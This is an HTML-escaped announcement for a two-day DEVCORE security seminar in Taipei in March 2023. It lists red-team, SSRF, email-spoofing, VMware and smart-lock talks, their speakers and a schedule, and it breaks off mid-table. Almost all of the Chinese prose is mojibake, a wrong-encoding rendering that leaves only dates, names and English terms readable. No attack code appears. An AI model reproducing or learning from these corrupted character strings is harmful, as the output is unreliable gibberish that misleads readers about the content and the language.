&lt;p&gt;Á¥ÖÈöäÁ∏ΩÁõ£Êö®ÂÖ±ÂêåÂâµËæ¶‰∫∫Ë®±Âæ©Âá±ÔºàShaolinÔºâÂâáÂº∑Ë™øÔºåÁõÆÂâçÂè∞ÁÅ£ÂÉÖÊúâ DEVCORE È°òÊÑèÂÖ¨ÈñãÂàÜ‰∫´Á¥ÖÈöäÈÄ≤ÈöéÊîªÊìäÊäÄÊ≥ïÔºåÊ©üÊúÉÁõ∏Áï∂Èõ£ÂæóÔºåËÄåÊ≠§Â†¥Á†îË®éÊúÉ‰∏çÂÉÖÈÅ©ÂêàÂ∏åÊúõÊõ¥Âä†Ê∑±ÂÖ•‰∫ÜËß£ÊîªÊìäÊäÄË°ìÁöÑËÅΩÁúæÔºå‰πüÂæàÈÅ©Âêà‰ºÅÊ•≠ËóçÈöäËóâÊ≠§‰∫ÜËß£Á¥ÖÈöäÂ¶Ç‰ΩïÁúãÂæÖÈò≤Á¶¶ÔºåÂæû‰∏≠Áç≤ÂæóÂïüÁôºÔºå‰ª•‰∫ÜËß£ÂèØ‰ª•Âº∑ÂåñÁöÑÈò≤Á¶¶Èù¢ÂêëÔºåÁèæÂ†¥‰πüÂ∞áËàáËÅΩÁúæ‰∫§ÊµÅÊäÄË°ìÂèäÈß≠ÂÆ¢ÊÄùÁ∂≠„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈáùÂ∞çÈß≠ÂÆ¢Â†¥ÔºåË®±Âæ©Âá±ÂàÜÊûêÔºå‰∏äÂçäÂ†¥Â∞áÊñºËÅΩÁúæÂàÜ‰∫´Á¥ÖÈöäÂú®ÁúüÂØ¶ÊºîÁ∑¥ÊôÇÂ¶Ç‰ΩïÈÅãÁî®‰ºÅÊ•≠ËàáËóçÈöäÈõ£‰ª•ÊÉ≥ÂÉèÁöÑÊîªÊìäÊâãÊ≥ïÔºå‰∏ãÂçäÂ†¥ÂâáËëóÈáçÂàÜ‰∫´ DEVCORE ÂúòÈöäÂ∞çÁúüÂØ¶‰∏ñÁïåÁî¢ÂìÅÁöÑÁ†îÁ©∂ÊâãÊ≥ïÔºåÁîöËá≥‰πüÊúâÂÖ®ÁêÉÁôΩÂ∏ΩÈß≠ÂÆ¢ÊúÄÈ´òÊÆøÂ†Ç Pwn2Own Á≠âÂèÉË≥ΩËÉåÂæåÁßòËæõËàáË∂£‰∫ãÔºåÂ†¥Â†¥Á≤æËèØÔºå‰∏çÂÆπÈåØÈÅé„ÄÇ&lt;/p&gt;

&lt;p&gt;Èß≠ÂÆ¢Â†¥Â∞áÂàÜ‰∫´ÊúÄÊñ∞ÊºèÊ¥ûÁ†îÁ©∂ÂèäÁúüÂØ¶Á¥ÖÈöäÊºîÁ∑¥Ê°à‰æãÔºåÂåÖÂê´ÔºöÂæûÈõ∂ÈñãÂßãÁöÑ Pwn2Own Èß≠ÂÆ¢Â§ßË≥ΩÂ•™ÂÜ†‰πãË∑Ø„ÄÅÂ¶Ç‰Ωï‰ª• MITRE ATT&amp;amp;CK Ê°ÜÊû∂Ê™¢Ë¶ñÁ¥ÖÈöäÊºîÁ∑¥„ÄÅSSRF ÊîªÊìäÊâãÊ≥ïËàáÂØ¶Êà∞Á≤æËèØ„ÄÅEmail Áèæ‰ª£ÊîªÊìäÊâãÊ≥ï„ÄÅÂ¶Ç‰ΩïÂ∞áÂª¢Ê¥û‰∏≤Êé•Êàê RCE ÊºèÊ¥û„ÄÅËôõÊì¨Ê©ü‰πãÂÆâÂÖ®ÊåëÊà∞„ÄÅÁâ©ËÅØÁ∂≤Ë£ùÁΩÆÊîªÊìäÂØ¶‰æã„ÄÇ‰ºÅÊ•≠Â†¥ÂâáÂ∞á‰ª•Ê∑±ÂÖ•Ê∑∫Âá∫ÁöÑÊñπÂºèÂàÜ‰∫´Âè∞ÁÅ£Ë≥áÂÆâÂçÅÂπ¥Êõ¥Êñ∞Ëø≠‰ª£„ÄÅDEVCORE ÂçÅÂπ¥Ë≥áÂÆâÂ•áÂπªÊóÖÁ®ã„ÄÅÁ¥ÖÈöäÊºîÁ∑¥Á≠ñÁï•‰ΩøÁî®ÊñπÂºèËàáÁúüÊ≠£ÂÉπÂÄº„ÄÅ‰ºÅÊ•≠Â∏∏Ë¶ãË≥áÂÆâÈ¢®Èö™„ÄÅÊúÄËÆìÈß≠ÂÆ¢È†≠ÁóõÁöÑË≥áÂÆâÈò≤Á¶¶Ê©üÂà∂Á≠â„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Ê¥ªÂãïË≥áË®ä&quot;&gt;Ê¥ªÂãïË≥áË®ä&lt;/h2&gt;

&lt;h3 id=&quot;ÊôÇÈñì&quot;&gt;ÊôÇÈñìÔºö&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;‰ºÅÊ•≠Â†¥Ôºö2023/03/10Ôºà‰∫îÔºâ13:00 - 16:30ÔºàÂ†±ÂêçÂØ©Ê†∏Âà∂Ôºâ&lt;/li&gt;
  &lt;li&gt;Èß≠ÂÆ¢Â†¥Ôºö2023/03/11ÔºàÂÖ≠Ôºâ08:40 - 16:20ÔºàÊî∂Ë≤ªÂà∂Ôºâ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Âú∞Èªû&quot;&gt;Âú∞ÈªûÔºö&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;TICC Âè∞ÂåóÂúãÈöõÊúÉË≠∞‰∏≠ÂøÉ 201 ÊúÉË≠∞ÂÆ§ÔºàÂè∞ÂåóÂ∏Ç‰ø°Áæ©ÂçÄ‰ø°Áæ©Ë∑Ø‰∫îÊÆµ1ËôüÔºâ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ë≤ªÁî®&quot;&gt;Ë≤ªÁî®Ôºö&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;2023/03/10Ôºà‰∫îÔºâ‰ºÅÊ•≠Â†¥ÔºöÂÖçË≤ª&lt;/li&gt;
  &lt;li&gt;2023/03/11ÔºàÂÖ≠ÔºâÈß≠ÂÆ¢Â†¥ÔºàÂçÅÈÄ±Âπ¥ÁâπÊÉ†ÂÉπÔºâÔºöÊó©È≥•Á•® 3,000 ÂÖÉÔºàÈôêÈ°ç 150 ÂêçÔºâÔºõÊôöÈ≥•Á•® 5,000 ÂÖÉÔºõÂ≠∏ÁîüÁ•® 1,500 ÂÖÉ&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;Ë≠∞Á®ã‰ªãÁ¥π&quot;&gt;Ë≠∞Á®ã‰ªãÁ¥π&lt;/h2&gt;

&lt;h3 id=&quot;20230310‰∫î‰ºÅÊ•≠Â†¥&quot;&gt;2023/03/10Ôºà‰∫îÔºâ‰ºÅÊ•≠Â†¥Ôºö&lt;/h3&gt;

&lt;p&gt;Êú¨Â†¥Ê¨°Â∞àÁÇ∫‰ºÅÊ•≠Ê±∫Á≠ñËÄÖÂèäË≥áÂÆâÁÆ°ÁêÜËÄÖÈáèË∫´ÊâìÈÄ†ÔºåÂ∞áÂæû DEVCORE ÁÇ∫‰ΩïÊñº 2017 Âπ¥ÁôºÁèæÂÆ¢Êà∂ÈúÄÊ±Ç„ÄÅÈ¶ñÂÖàÊé®Âá∫Á¥ÖÈöäÊºîÁ∑¥ÈñãÂßãÔºåÁ¥∞Êï∏ 5 Âπ¥‰æÜÊàëÂÄëÂú®Ëøë 70 Â†¥Á¥ÖÈöäÊºîÁ∑¥‰∏≠ÁöÑÁèçË≤¥ÁôºÁèæÔºåÂåÖÂê´‰æõÊáâÈèà‰∏≠ÊòìË¢´ÂøΩÁï•ÁöÑË≥áÂÆâÈ¢®Èö™„ÄÅË≥áÂÆâÁ≠ñÁï•ËàáÊ©üÂà∂ÂÑ™ÂÖàÈ†ÜÂ∫èÂ¶Ç‰ΩïÊñüÈÖå„ÄÅË≥áÂÆâÁî¢ÂìÅÊúâÊïàÊÄßÈ©óË≠âÁ≠â„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≠§Â§ñÔºåÊàëÂÄë‰πüÂ∞áÈÄèÈÅéÊ≠§Â†¥Á†îË®éÊúÉÔºåÂçîÂä©‰ºÅÊ•≠ÁêÜËß£Â¶Ç‰ΩïÊâìÈÄ†ÊúÄÈÅ©ÂêàÁöÑË≥áÂÆâÊà∞Áï•Ôºå‰∏¶ËÉΩÊúâÊïà„ÄÅÊ≠£Á¢∫‰ΩøÁî®Á¥ÖÈöäÊºîÁ∑¥Ê≠§È†ÖÁ≠ñÁï•Â∑•ÂÖ∑ÔºåÈÅîÂà∞Ë≠òÂà•È¢®Èö™„ÄÅ‰∏¶ÁôºÊèÆÁ¥ÖÈöäÊºîÁ∑¥ÊúÄÂ§ßÊïàÁõä„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú®‰ºÅÊ•≠Â†¥‰∏≠ÔºåÊàëÂÄë‰πüÁâπÂà•Á¥çÂÖ•‰ºÅÊ•≠ÊúÄÂ∏∏Ë¶ãÁöÑË≥áÂÆâÂïèÈ°å„ÄÅÂ¶Ç‰ΩïËá™ÊàëË©ï‰º∞ÂÆâÂÖ®„ÄÅÂ¶Ç‰Ωï‰øùË≠∑Á∂≤ÂüüÊúçÂãôÔºàADÔºâÁ≠âÔºåÂª∫Á´ãË≥áÂÆâËá™‰øùËßÄÂøµÂæåÔºåÂÜçÈÄ≤‰∏ÄÊ≠•Êé¢Ë®éÂì™‰∫õÈò≤Á¶¶Ê©üÂà∂ËàáÁî¢Ê•≠Â∞§Èõ£ÊîªÈô∑„ÄÅÊîªÊìäËÄÖÂ¶Ç‰ΩïÊÉÖËíêËàáÊåëÈÅ∏ÁõÆÊ®ôÁ≠â„ÄÇ&lt;/p&gt;

&lt;p&gt;Èù¢Â∞çÊ∞∏‰∏çÂÅúÊ≠áÁöÑÁ∂≤Ë∑ØÊà∞ÔºåÂª∫ÊßãÊ≠£Á¢∫ÁöÑË≥áÂÆâÁ≠ñÁï•ÔºåÂ∞áÊòØËøéÊà∞ÁöÑÁ¨¨‰∏ÄÊ≠•ÔºåËÄåÂîØÊúâ‰∫ÜËß£ÁúüÂØ¶ÁöÑÈß≠ÂÆ¢ÊÄùÁ∂≠ËàáÊîªÊìäÊñπÂºèÔºåÊâçËÉΩÁ¢∫‰øù‰ºÅÊ•≠Á´ãÊñº‰∏çÊïó‰πãÂú∞„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;20230311ÂÖ≠Èß≠ÂÆ¢Â†¥&quot;&gt;2023/03/11ÔºàÂÖ≠ÔºâÈß≠ÂÆ¢Â†¥Ôºö&lt;/h3&gt;

&lt;p&gt;Êú¨Â†¥Ê¨°Â∞áÊ∑±ÂÖ•Êé¢Ë®éÊúÄÊñ∞ÊîªÊìäÊâãÊ≥ïËàáÊºèÊ¥ûÔºåÈÅ©ÂêàË≥áÂÆâÊäÄË°ì‰∫∫Âì°ÂèäÊúâËààË∂£ÁöÑË≥áÂÆâÁÆ°ÁêÜÈöéÂ±§ÂèÉËàá„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;‰ª•Á¥ÖÈöäÊÄùÁ∂≠ÁúãËóçÈöäÈò≤Á¶¶ÔºåÁ¥ÖËóçÊîªÈò≤‰∏≠ÁöÑÁ∂ìÂÖ∏Ê°à‰æã&lt;/strong&gt;
ÂÖ∑ÂÇôË±êÂØåÊåáÊèÆ‰ΩúÊà∞Á∂ìÈ©óÁöÑ DEVCORE Á¥ÖÈöäÊºîÁ∑¥ÈöäÈï∑ DingÔºåÂ∞áÊñºÊú¨Â†¥Ë≠∞Á®ã‰∏≠ÂàÜ‰∫´Ëøë 70 Â†¥Ê©´Ë∑®ÈáëËûç„ÄÅÁßëÊäÄ„ÄÅÈõªÂïÜ„ÄÅÂÇ≥Áî¢Á≠âÂêÑÁî¢Ê•≠Á∂ìÂÖ∏Ê°à‰æãÔºå‰∏¶‰ª• MITRE ATT&amp;amp;CK Ê°ÜÊû∂ÔºåÈÄê‰∏ÄÂàÜÊûêÂØ¶Êà∞Á∂ìÈ©ó‰∏≠‰ΩøÁî®ÁöÑÊà∞Ë°ìËàáÊîªÊìäÊâãÊ≥ïÔºöÂàùÂßãÂÖ•‰æµÈô§‰∫ÜOWASP TOP 10 ‰∏≠Â∏∏Ë¶ãÊîªÊìäÊäÄÂ∑ßÂ§ñÈÇÑÊúâÂì™‰∫õÊñπÂºèÔºüÊîªÊìäËÄÖÂ¶Ç‰ΩïÊåÅÁ∫åÊΩõ‰ºèÔºå‰∏îÂêåÊôÇÈÅîÊàêÈò≤ÊØíËªüÈ´îÊú™Á§∫Ë≠¶„ÄÅ‰∫¶ÁÑ°Ê™îÊ°àËêΩÂú∞ÔºüÊîªÊìäËÄÖÂ¶Ç‰ΩïÂú®Á∂≤Ë∑ØÂØ¶È´îÈöîÈõ¢ÊôÇ‰ªçËÉΩÊ©´ÂêëÁßªÂãïÔºüÊîªÊìäËÄÖÂ¶Ç‰Ωï‰ª•Âá∫‰∫∫ÊÑèÊñôÁöÑÊâãÊÆµÊèêÂçáÊ¨äÈôêÔºü&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ËÆìÊµÅÈáèÁ©øÈÅé‰Ω†ÁöÑÂ∑¥Â∑¥ - Á¥ÖÈöäÂØ¶Êà∞ SSRF Á∂ìÂÖ∏Ê°à‰æã&lt;/strong&gt;
ÂÑòÁÆ° SSRF ÊòØ‰∏ÄÂÄãÊ≠∑Âè≤ÊÇ†‰πÖÁöÑÁü•ÂêçÊîªÊìäÊâãÊ≥ïÔºåÊîªÊìäËÄÖÂèØËóâÊ≠§Á©øÈÅéÂ§ñÁ∂≤Èò≤ÁÅ´ÁâÜ„ÄÅÂÖ•‰æµÂÖßÁ∂≤Ôºå‰ΩÜÁõ∏ËºÉÊñºÊåá‰ª§Ê≥®ÂÖ•Êàñ‰ªªÊÑèÊ™îÊ°à‰∏äÂÇ≥Á≠âÈ°û RCE ÊºèÊ¥ûÔºåÂÖ∂Âö¥ÈáçÊÄß‰ºº‰πéÁï•ÈÅú‰∏ÄÁ±å„ÄÇÁ¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ Vtim Â∞á‰ª•ÈÅéÂéªÊñºÁ¥ÖÈöäÊºîÁ∑¥Â∞àÊ°à‰∏≠ÈÅáÂà∞ÁöÑ SSRF ÁúüÂØ¶Ê°à‰æãÔºåÊé¢Ë®éÂÖ∂Á©∂Á´üÊòØÂ†±Âëä‰∏äÊúâÂêçÁÑ°ÂØ¶ÁöÑÈ´òÈ¢®Èö™ÊºèÊ¥ûÔºåÊàñÊòØ‰ºÅÊ•≠‰ªç‰∏çËÉΩÂøΩË¶ñÁöÑÈáçË¶ÅÂÆâÂÖ®ÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;I wanna know ‰Ω†‰ø°‰∏ç‰ø° - Áèæ‰ª£ÈÉµ‰ª∂Ë©êË°ì&lt;/strong&gt;
ÂéªÂπ¥ÊñºÂúãÈöõÊäÄËÉΩÁ´∂Ë≥ΩÁ∂≤Ë∑ØÂÆâÂÖ®ËÅ∑È°ûÂèñÂæóÈäÄÁâåÁöÑÂè∞ÁÅ£ÂúãÊâãÔºåÂêåÊôÇ‰πüÊòØ DEVCORE Á¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ÁöÑ MicoÔºåÂ∞áÊñºÊ≠§Â†¥Ë≠∞Á®ã‰∏≠ÂàÜ‰∫´ÂêÑÁ®Æ‰ºÅÊ•≠ÁµÑÁπîËàáÂÄã‰∫∫Êî∂‰ø°ÊñπÂºèÁµÑÂêàÂºèÊîªÊìäÊâãÊ≥ïÔºå‰∏¶ÈÄê‰∏ÄÂâñÊûêÊîªÊìäËÄÖÂ¶Ç‰Ωï‰ΩøÁî® Email ÂÅΩÈÄ†Ê¨∫È®ô‰ª•ÂèäÁπûÈÅéÂûÉÂúæÈÉµ‰ª∂ÈÅéÊøæÂô®ÔºåÂçîÂä©‰ºÅÊ•≠Èò≤ÁØÑ‰ª• Email ÂÅöÁÇ∫ÂàùÂßãÂÖ•‰æµÈªûÁöÑÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ÈªëÈ≠îÊ≥ï„ÄÅÂ§ßÂ£ûËõãÂæóÂ¥©ÔºåËÆìÂõõÂÄãËá≠Ëü≤ËÆäÊàêÊºèÊ¥ûÂêßÔºÅ&lt;/strong&gt;
ÂÜçÂª¢ÁöÑ‰ΩéÂàÜÊºèÊ¥û‰πüÊúâÊò•Â§©ÔºÅÈõûËÇãËà¨ÁöÑÂº±ÈªûÔºåÂ∞çÁ¥ÖÈöäËÄåË®ÄÈÇÑÊúâ‰ªª‰ΩïÂà©Áî®ÂÉπÂÄºÂóéÔºü‰ΩéÈ¢®Èö™„ÄÅÂà©Áî®Ê©üÊúÉ‰πü‰ΩéÁöÑÂ∞èÊºèÊ¥ûÔºå‰ºÅÊ•≠ÁúüÁöÑÂèØ‰ª•ÁΩÆ‰πã‰∏çÁêÜÂóéÔºüDEVCORE Ë≥áÊ∑±Á¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ Cyku Âèä ÊäÄË°ìÂ∞àÊ°àÁ∂ìÁêÜ Crystal Â∞áÈÄèÈÅéÂØ¶ÈöõÊ°à‰æãÔºåÂàÜ‰∫´ÊîªÊìäËÄÖÂ¶Ç‰ΩïÂ∞áÂõõÂÄã CVSS Âπæ‰πé 0.0 ÂàÜÁöÑÂª¢Ê¥ûÂåñËÖêÊúΩÁÇ∫Á•ûÂ•áÔºå‰∏≤Êàê RCE ÊºèÊ¥û„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ÊåëÊà∞ÁôæËê¨Ë≥ûÈáëÔºÅËôõÊì¨‰∏ñÁïå‰πãÂØÜÂÆ§ÈÄÉËÑ´&lt;/strong&gt;
‰ª•ËôõÊì¨Ê©üÂàÜÊûêÊÉ°ÊÑèÁ®ãÂºèÊòØÁõÆÂâçË¢´Âª£Ê≥õÊé°Áî®ÁöÑÂàÜÊûêÊñπÂºè‰πã‰∏ÄÔºåÁÑ∂ËÄåÂÖ∂ËÉåÂæåÂçªÂèØËÉΩÂ≠òÂú®ÊòìË¢´ÂøΩÁï•ÁöÑÂÆâÂÖ®ÂïèÈ°åÂèäÊºèÊ¥û„ÄÇÊõæÁç≤Èß≠ÂÆ¢Â•ßÊñØÂç° Pwnie Awards „ÄåÊúÄ‰Ω≥‰º∫ÊúçÂô®ÊºèÊ¥û„Äç ËÇØÂÆöÁöÑË≥áÊ∑±Ë≥áÂÆâÁ†îÁ©∂Âì° Meh Â∞á‰ª• VMware ‰∏≠ÊΩõËóèÊñº DHCP ÂçîË≠∞ÁöÑÊºèÊ¥ûÁÇ∫‰æãÔºåËàáËÅΩÁúæÂàÜ‰∫´ËôõÊì¨Ê©üÊΩõÂú®ÁöÑË≥áÂÆâÈ¢®Èö™‰ª•ÂèäÂÖ∂Á†îÁ©∂ÊàêÊûú„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remote Door Execution&lt;/strong&gt;
ÂÆ∂Áî®Áâ©ËÅØÁ∂≤Ë£ùÁΩÆË¢´Èß≠ÂÆ¢Áî®‰ª•Áõ£ÁúãÊàñÁõ£ËÅΩÂ∑≤ÊòØÂª£ÁÇ∫‰∫∫Áü•ÁöÑË≥áÂÆâÂïèÈ°åÔºåÁÑ∂ËÄåËã•ÈñÄÈéñ‰πüËÉΩË¢´ÈÅ†Á´ØÈÅôÊéßÈñãÂïüÔºåÈô§‰∫ÜÂÄã‰∫∫Èö±ÁßÅÈÅ≠Âà∞‰æµÁäØÔºåÊõ¥ÊòØÂ±ÖÂÆ∂ÂÆâÂÖ®ÁöÑÈáçÂ§ßÂ®ÅËÑÖ„ÄÇËàáÁ†îÁ©∂ÂúòÈöäÂÖ±ÂêåÂ•™Âæó Pwn2Own Toronto 2022 ÂÜ†ËªçÁöÑË≥áÂÆâÁ†îÁ©∂Âì° NiniÔºåÂ∞áÊñºÊú¨Â†¥Ë≠∞Á®ã‰∏≠ÂàÜ‰∫´ÂÖ∂Â¶Ç‰ΩïÂòóË©¶ÈÄèÈÅéËªüÁ°¨È´îÊîªÊìäÔºåÊúÄÁµÇÂú®ÈõªÂ≠êÈéñ‰∏äÁôºÊéòÂèØ‰ª•‰ªªÊÑèÈñãÈñÄÁöÑÊºèÊ¥û„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;From Zero to Hero - ÂæûÈõ∂ÈñãÂßãÁöÑ Pwn2Own Â•™ÂÜ†‰πãË∑Ø&lt;/strong&gt;
DEVCORE Ëá™ 2020 Âπ¥ÈñãÂßãÂèÉËàáÁôΩÂ∏ΩÈß≠ÂÆ¢ÊúÄÈ´òÊÆøÂ†ÇÁ´∂Ë≥Ω Pwn2OwnÔºåËøÑ‰ªäÊãø‰∏ãÂÖ©Ê¨°‰∫ûËªç„ÄÅÂÖ©Ê¨°ÂÜ†Ëªç„ÄÇÊ≠§Â†¥Ë≠∞Á®ãÂ∞áÁî±Èß≠ÂÆ¢ÁïåÈ†óË≤†ÁõõÂêç„ÄÅÂ±¢Â±¢Áç≤Áçé‰∏¶ÂèóÈÇÄÊºîË¨õÁöÑ DEVCORE È¶ñÂ∏≠Ë≥áÂÆâÁ†îÁ©∂Âì° Orange ÂèäË≥áÊ∑±Ë≥áÂÆâÁ†îÁ©∂Âì° Angelboy ÂÖ±Âêå‰∏ªË¨õÔºåËàáÊúÉÁúæÂàÜ‰∫´Â¶Ç‰ΩïÊåëÈÅ∏ÁõÆÊ®ô„ÄÅÂª∫Á´ãÂúòÈöäÈªòÂ•ë„ÄÅË©¶Ë™§ËàáÂ≠∏Áøí„ÄÅËàáÂª†ÂïÜ‰πãÈñìÁöÑÊîªÈò≤Êà∞Á≠âÂèÉË≥ΩËÉåÂæåÁßòËæõËàáË∂£‰∫ã„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Ë≠∞Á®ãË°®&quot;&gt;Ë≠∞Á®ãË°®&lt;/h2&gt;

&lt;h3 id=&quot;20230310‰∫î‰ºÅÊ•≠Â†¥-1&quot;&gt;2023/03/10Ôºà‰∫îÔºâ‰ºÅÊ•≠Â†¥Ôºö&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ÊôÇÈñì&lt;/th&gt;
      &lt;th&gt;Ë≠∞Á®ã&lt;/th&gt;
      &lt;th&gt;Ë¨õÂ∏´&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;13:00 - 13:30&lt;/td&gt;
      &lt;td&gt;‰æÜË≥ìÂ†±Âà∞&lt;/td&gt;
      &lt;td&gt;Ôºè&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;13:30 - 13:40&lt;/td&gt;
      &lt;td&gt;ÈñãÂπï&lt;/td&gt;
      &lt;td&gt;Ôºè&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;13:40 - 14:10&lt;/td&gt;
      &lt;td&gt;ÊîªÊìä‰∏ÄÊó•ÔºåÂâµÊ•≠ÂçÅÂπ¥&lt;/td&gt;
      &lt;td&gt;DEVCORE Âü∑Ë°åÈï∑Êö®ÂÖ±ÂêåÂâµËæ¶‰∫∫ Allen&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:10 - 14:40&lt;/td&gt;
      &lt;td&gt;Á¥ÖÈöäÁ¥ÖÈöäÔºåÂ§öÂ∞ëÊúçÂãôÂÅáÊ±ù‰πãÂêçËÄåË°åÔºÅ&lt;/td&gt;
      &lt;td&gt;DEVCORE ÂïÜÂãôÁôºÂ±ïÁ∏ΩÁõ£ Aaron&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:40 - 15:20&lt;/td&gt;
      &lt;td&gt;‰∏≠Â†¥‰ºëÊÅØ&lt;/td&gt;
      &lt;td&gt;Ôºè&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;15:20 - 15:50&lt;/td&gt;
      &lt;td&gt;Á¥ÖÈöäÂ∏∏Ë¶ã Q&amp;amp;A Â§ßËß£ÂØÜ&lt;/td&gt;
      &lt;td&gt;DEVCORE Ë≥áÊ∑±ÂâØÁ∏ΩÊö®ÂÖ±ÂêåÂâµËæ¶‰∫∫ Bowen&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;15:50 - 16:20&lt;/td&gt;
      &lt;td&gt;Á¥ÖÈöäÁöÑ‰∏ã‰∏ÄÊ≠• Ver. 2023&lt;/td&gt;
      &lt;td&gt;DEVCORE Á¥ÖÈöäÁ∏ΩÁõ£Êö®ÂÖ±ÂêåÂâµËæ¶‰∫∫ Shaolin&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;16:20 - 16:30&lt;/td&gt;
      &lt;td&gt;ÈñâÂπï&lt;/td&gt;
      &lt;td&gt;Ôºè&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;20230311ÂÖ≠Èß≠ÂÆ¢Â†¥-1&quot;&gt;2023/03/11ÔºàÂÖ≠ÔºâÈß≠ÂÆ¢Â†¥Ôºö&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ÊôÇÈñì&lt;/th&gt;
      &lt;th&gt;Ë≠∞Á®ã&lt;/th&gt;
      &lt;th&gt;Ë¨õÂ∏´&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;08:40 - 09:30&lt;/td&gt;
      &lt;td&gt;‰æÜË≥ìÂ†±Âà∞&lt;/td&gt;
      &lt;td&gt;Ôºè&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;09:30 - 09:40&lt;/td&gt;
      &lt;td&gt;ÈñãÂπï&lt;/td&gt;
      &lt;td&gt;Ôºè&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;09:40 - 10:10&lt;/td&gt;
      &lt;td&gt;‰ª•Á¥ÖÈöäÊÄùÁ∂≠ÁúãËóçÈöäÈò≤Á¶¶ÔºåÁ¥ÖËóçÊîªÈò≤‰∏≠ÁöÑÁ∂ìÂÖ∏Ê°à‰æã&lt;/td&gt;
      &lt;td&gt;DEVCORE Á¥ÖÈöäÊºîÁ∑¥ÈöäÈï∑ Ding&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10:10 - 10:40&lt;/td&gt;
      &lt;td&gt;ËÆìÊµÅÈáèÁ©øÈÅé‰Ω†ÁöÑÂ∑¥Â∑¥ - Á¥ÖÈöäÂØ¶Êà∞ SSRF Á∂ìÂÖ∏Ê°à‰æã&lt;/td&gt;
      &lt;td&gt;DEVCORE Á¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ Vtim&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10:40 - 11:00&lt;/td&gt;
      &lt;td&gt;‰∏≠Â†¥‰ºëÊÅØ&lt;/td&gt;
      &lt;td&gt;/&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11:00 - 11:30&lt;/td&gt;
      &lt;td&gt;I wanna know ‰Ω†‰ø°‰∏ç‰ø° - Áèæ‰ª£ÈÉµ‰ª∂Ë©êË°ì&lt;/td&gt;
      &lt;td&gt;DEVCORE Á¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ Mico&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11:30 - 12:00&lt;/td&gt;
      &lt;td&gt;ÈªëÈ≠îÊ≥ï„ÄÅÂ§ßÂ£ûËõãÂæóÂ¥©ÔºåËÆìÂõõÂÄãËá≠Ëü≤ËÆäÊàêÊºèÊ¥ûÂêßÔºÅ&lt;/td&gt;
      &lt;td&gt;DEVCORE Ë≥áÊ∑±Á¥ÖÈöäÊºîÁ∑¥Â∞àÂÆ∂ Cyku&lt;br /&gt; &amp;amp; ÊäÄË°ìÂ∞àÊ°àÁ∂ìÁêÜ Crystal&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12:00 - 13:30&lt;/td&gt;
      &lt;td&gt;ÂçàÈ§ê‰ºëÊÅØ&lt;/td&gt;
      &lt;td&gt;Ôºè&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;13:30 - 14:00&lt;/td&gt;
      &lt;td&gt;ÊåëÊà∞ÁôæËê¨Ë≥ûÈáëÔºÅËôõÊì¨‰∏ñÁïå‰πãÂØÜÂÆ§ÈÄÉËÑ´&lt;/td&gt;
      &lt;td&gt;DEVCORE Ë≥áÊ∑±Ë≥áÂÆâÁ†îÁ©∂Âì° Meh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:00 - 14:30&lt;/td&gt;
      &lt;td&gt;Remote Door Execution&lt;/td&gt;
      &lt;td&gt;DEVCORE Ë≥áÂÆâÁ†îÁ©∂Âì° Nini&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:30 - 15:10&lt;/td&gt;
      &lt;td&gt;‰∏≠Â†¥‰ºëÊÅØ&lt;/td&gt;
